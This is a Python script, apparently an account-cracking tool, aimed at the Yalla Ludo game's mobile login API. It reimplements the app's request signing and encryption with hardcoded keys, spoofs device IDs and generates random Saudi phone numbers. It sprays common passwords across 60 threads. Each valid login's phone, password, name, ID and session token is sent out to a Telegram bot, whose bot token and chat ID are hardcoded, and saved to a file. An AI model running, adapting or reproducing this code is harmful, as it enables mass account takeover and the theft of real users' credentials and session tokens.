# =========================
# تثبيت المكتبات تلقائياً
# =========================
import sys
import subprocess

REQUIRED_PACKAGES = {
    "requests": "requests",
    "Crypto": "pycryptodome",
    "colorama": "colorama",
    "cfonts": "python-cfonts",
}

def install_missing_packages():
    for module, package in REQUIRED_PACKAGES.items():
        try:
            __import__(module)
        except ImportError:
            print(f"📦 جاري تثبيت المكتبة: {package}")
            subprocess.check_call([
                sys.executable,
                "-m",
                "pip",
                "install",
                package
            ])

install_missing_packages()

# =========================
# الاستيرادات
# =========================
import base64
import json
import hashlib
import requests
import random
import threading
import time
import os
import struct
import uuid
import hmac as hmacmod
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
except ImportError:
    class Dummy:
        pass

    Fore = Back = Style = Dummy()
    Fore.GREEN = Fore.RED = Fore.YELLOW = Fore.CYAN = Fore.MAGENTA = ""
    Back.GREEN = Back.RED = Back.YELLOW = Back.WHITE = Back.BLACK = ""
    Style.BRIGHT = ""

from cfonts import render, say




version = '2.0'
b1key = b'4e82797b276c5cb729db62aaa229a057'
b1iv = b'0102030405060708'
secret = 'L3)qk*@8'
api = "https://httpgateway.carrstuv.com/api/LudoAccountLoginRpcApiProxy/MobileAccountLogin"
ua = "YallaLudo-1.5.0.0-(Build 1050003)-Android 32"

kvals = [int(abs(__import__('math').sin(i+1)) * 2**32) & 0xffffffff for i in range(64)]
shift = [7,12,17,22]*4 + [5,9,14,20]*4 + [4,11,16,23]*4 + [6,10,15,21]*4
ivrev = (0x10325476, 0x98badcfe, 0xefcdab89, 0x67452301)


def md5raw(msg, iv):
    a0, b0, c0, d0 = iv
    length = len(msg) * 8
    m = msg + b'\x80'
    while len(m) % 64 != 56:
        m += b'\x00'
    m += struct.pack('<Q', length)
    for ch in range(0, len(m), 64):
        block = struct.unpack('<16I', m[ch:ch+64])
        a, b, c, d = a0, b0, c0, d0
        for i in range(64):
            if i < 16:
                f = (b & c) | (~b & d)
                g = i
            elif i < 32:
                f = (d & b) | (~d & c)
                g = (5*i+1) % 16
            elif i < 48:
                f = b ^ c ^ d
                g = (3*i+5) % 16
            else:
                f = c ^ (b | ~d)
                g = (7*i) % 16
            f = (f + a + kvals[i] + block[g]) & 0xffffffff
            a = d
            d = c
            c = b
            b = (b + ((f << shift[i]) | (f >> (32-shift[i])))) & 0xffffffff
        a0 = (a0+a) & 0xffffffff
        b0 = (b0+b) & 0xffffffff
        c0 = (c0+c) & 0xffffffff
        d0 = (d0+d) & 0xffffffff
    return struct.pack('<4I', a0, b0, c0, d0)

def md5r(msg):
    return md5raw(msg, ivrev).hex()

def md5s(msg):
    return hashlib.md5(msg).hexdigest()

def md5upper(text):
    return hashlib.md5(text.encode('utf-8')).hexdigest().upper()

def encrypt(data, hera):
    k = md5r(hera.encode() + secret.encode()).encode()
    ks = (k * (len(data) // len(k) + 1))[:len(data)]
    return base64.b64encode(bytes(a ^ b for a, b in zip(data, ks))).decode()

def sign(data, hera):
    key = md5r(hera.encode() + secret.encode()).encode()
    return hmacmod.new(key, data, hashlib.sha256).hexdigest()

def medusa(data, hera):
    pt = f'{md5s(data)}-{len(data)}-{md5r(hera.encode() + secret.encode())}-{secret}'
    ct = AES.new(b1key, AES.MODE_CBC, b1iv).encrypt(pad(pt.encode(), 16))
    return base64.b64encode(ct).decode()

def gendevice():
    device = str(uuid.uuid4())
    android = f'{uuid.uuid4().hex}_{uuid.uuid4().hex[:16]}'
    chars = string.ascii_letters + string.digits
    shumeng = ''.join(random.choice(chars) for _ in range(36))
    nonce = f'{random.randint(-2**31, 2**31 - 1)}_{uuid.uuid4()}'
    return device, android, shumeng, nonce


device, android, shumeng, nonce = gendevice()

def baggage(timestamp):
    obj = {
        "timeSpan": timestamp, "version": "1.5.1.0",
        "deviceId": device, "deviceName": "samsung Galaxy S23 Ultra",
        "deviceType": 2, "downloadChannelId": 1,
        "shuMengId": shumeng, "nonce": nonce,
        "plateType": 0, "LanguageId": 2, "phoneModel": "SM-S918B",
        "X-Phone-Country": "SA", "X-Sim-Country": "SA",
        "AndroidId": android, "appType": 0,
    }
    return base64.b64encode(json.dumps(obj, separators=(',',':')).encode()).decode()

def buildrequest(body):
    now = int(time.time() * 1000)
    hera = uuid.uuid4().hex
    bag = baggage(str(now))
    endpoint = '/' + '/'.join(api.split('/')[3:])
    signed = (endpoint + '' + ua + bag).encode('utf-8')

    xsign = f'{version}_2_{sign(signed, hera)}'
    xmedusa = medusa(signed, hera)

    wire = json.dumps(
        {"paramJsonString": encrypt(body, hera)},
        separators=(',',':')
    ).encode('utf-8')

    headers = {
        'User-Agent': ua,
        'UserId': '0',
        'X-App-Id': 'ludo',
        'X-Baggage': bag,
        'X-Access-Token': '',
        'X-Timestamp': str(now),
        'versionString': '1.5.1.0',
        'X-Sign': xsign,
        'X-Hera': hera,
        'X-Time': str(now),
        'X-Medusa': xmedusa,
        'Content-Type': 'application/json; charset=utf-8',
    }
    return headers, wire

def payload(mobile, password):
    data = {
        "mobile": mobile, "areaCode": "966", "password": password,
        "languageId": 2, "nationalityId": "1",
        "hostConfig": [
            {"bizType":5000,"countryCode":"IQ","hostUrl":"https://api-shumeng.yalla.games","type":2,"version":4},
            {"bizType":5001,"countryCode":"","hostUrl":"ws://firebreak.yalla.games","type":1,"version":1},
            {"bizType":1006,"countryCode":"IQ","hostUrl":"https://httpgateway.foodjkl.com,https://httpgateway.planecde.com,https://httpgateway.carrstuv.com","type":2,"version":20},
            {"bizType":1000,"countryCode":"IQ","hostUrl":"https://account.foodjkl.com,https://account.yalla.games,https://account.carrstuv.com","type":2,"version":19},
        ],
        "simCountry": "SA", "version": "1.5.1.0",
        "deviceId": device, "deviceName": "samsung Galaxy S23 Ultra",
        "deviceType": 2, "downloadChannelId": 1,
        "shuMengId": shumeng, "nonce": nonce,
        "plateType": 0, "phoneModel": "SM-S918B",
        "X-Phone-Country": "SA", "X-Sim-Country": "SA",
        "AndroidId": android, "IsSubpackages": 0, "appType": 0, "idfa": "",
    }
    return json.dumps(data, separators=(',',':'), ensure_ascii=False).encode('utf-8')

def decode(resp, hera=None):
    xorkey = bytes.fromhex("3336613636313637666532623236633033363933663061643936653462613439")
    param = resp.get("paramJsonString", "")
    if not param:
        return resp
    raw = base64.b64decode(param)
    try:
        xored = bytes(v ^ xorkey[i % len(xorkey)] for i, v in enumerate(raw))
        return json.loads(xored.decode('utf-8'))
    except Exception:
        pass
    if hera:
        try:
            k = md5r(hera.encode() + secret.encode()).encode()
            ks = (k * (len(raw) // len(k) + 1))[:len(raw)]
            dec = bytes(a ^ b for a, b in zip(raw, ks))
            return json.loads(dec.decode('utf-8'))
        except Exception:
            pass
    return resp


BOT_TOKEN = "8988065622:AAEa6v0pDe4eatH509nuwZmywOXx__NgqxE"
CHAT_ID = 6891530912
results = []
stats = defaultdict(int)
lock = threading.Lock()
stop_flag = False
MAX_RESULTS = 2000
valid_accounts_file = "A_valid_accounts.txt"

PASSWORDS = [
    'Aa123456', 'As123456', 'Aa123123', 'Aa1234567890',
    'Aa112233', 'Aa1234567', 'Aa12345678', 'Aa123456789',
    'Qwer1234', 'Qwer12345', 'Qwer123456',
    'Bb123456', 'Bb1234567', 'Bb12345678',
    'Qq123456', 'Ww123456', 'Zz123456',
    'Cc123456', 'Dd123456',
]

def send_telegram(phone, pwd, extra_info=""):
    if not BOT_TOKEN or not CHAT_ID:
        return
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        text = f"Phone: {phone}\nPass: {pwd}\n{extra_info}\n@ktk9k"
        requests.post(url, json={"chat_id": CHAT_ID, "text": text}, timeout=5)
    except Exception:
        pass

def save_valid_account(phone, pwd, extra_info=""):
    try:
        with open(valid_accounts_file, "a", encoding="utf-8") as f:
            f.write(f"Phone: {phone}\nPass: {pwd}\n{extra_info}\n")
            f.write("=" * 50 + "\n")
    except Exception:
        pass

def print_logo():
    try:
        output = render('K a R a R', colors=['green', 'red'], align='center')
        print(output)
    except:
        pass


def check_number(mobile):
    global results, stats
    if stop_flag:
        return

    mobile_clean = mobile.lstrip("0")
    
    for pwd in PASSWORDS:
        if stop_flag:
            return
        
        pwd_hash = md5upper(pwd)
        body = payload(mobile_clean, pwd_hash)
        
        try:
            headers, wire = buildrequest(body)
            hera = headers['X-Hera']
            
            
            response = requests.post(api, data=wire, headers=headers, timeout=15)
            
            if response.status_code != 200:
                continue
                
            result = decode(response.json(), hera)
            
            if not result:
                continue
                
            status = result.get("status", -1)
            
            
            if status == 0:
                acct = result.get("data", {})
                name = acct.get("name", "")
                uid = acct.get("id", "")
                token = acct.get("token", "")
                info = f"Name: {name}\nID: {uid}\nToken: {token}"
                
                with lock:
                    results.append("good")
                    stats['good'] += 1
                    stats['total'] += 1
                
                send_telegram(mobile, pwd, info)
                save_valid_account(mobile, pwd, info)
                return
            
            
            elif status == 151:
                continue
            
            
            elif status == 182 or status == 1001:
                with lock:
                    results.append("notreg")
                    stats['not_registered'] += 1
                    stats['total'] += 1
                return
            
            
            else:
                continue
                
        except requests.exceptions.Timeout:
            continue
        except requests.exceptions.ConnectionError:
            continue
        except Exception:
            continue
    
   
    with lock:
        results.append("wrong")
        stats['wrong_pass'] += 1
        stats['total'] += 1

def generate_mobile():
    return "05" + ''.join([str(random.randint(0, 9)) for _ in range(8)])

def print_dashboard():
    os.system('cls' if os.name == 'nt' else 'clear')
    print_logo()
    print(Fore.CYAN + "=" * 60)
    print(f"Total: {stats['total']}  |  {Fore.GREEN}HIT: {stats['good']}{Style.RESET_ALL}  |  {Fore.YELLOW}Wrong: {stats['wrong_pass']}{Style.RESET_ALL}  |  {Fore.RED}NotReg: {stats['not_registered']}{Style.RESET_ALL}")
    print(Fore.CYAN + "=" * 60)
    print("Press Ctrl+C to stop")

def dashboard_loop():
    while not stop_flag:
        print_dashboard()
        time.sleep(1)

def main():
    global stop_flag

    print_logo()
    print(f"Bot Token: {BOT_TOKEN[:20]}..." if BOT_TOKEN else "No Bot Token")
    print(f"Chat ID: {CHAT_ID}")
    print(f"Valid accounts will be saved to: {valid_accounts_file}")
    
    THREADS = 60

    dashboard_thread = threading.Thread(target=dashboard_loop, daemon=True)
    dashboard_thread.start()

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = []
        try:
            while not stop_flag:
                mobile = generate_mobile()
                futures.append(executor.submit(check_number, mobile))
                
                if len(futures) > 1000:
                    for f in as_completed(futures[:500]):
                        pass
                    futures = futures[500:]
                    
        except KeyboardInterrupt:
            print("\nStopped.")
            stop_flag = True
        
        for f in as_completed(futures):
            pass

    time.sleep(1)
    print(f"\nDone. HIT: {stats['good']}, Wrong: {stats['wrong_pass']}, NotReg: {stats['not_registered']}")
    print(f"Valid accounts saved to: {valid_accounts_file}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nStopped.")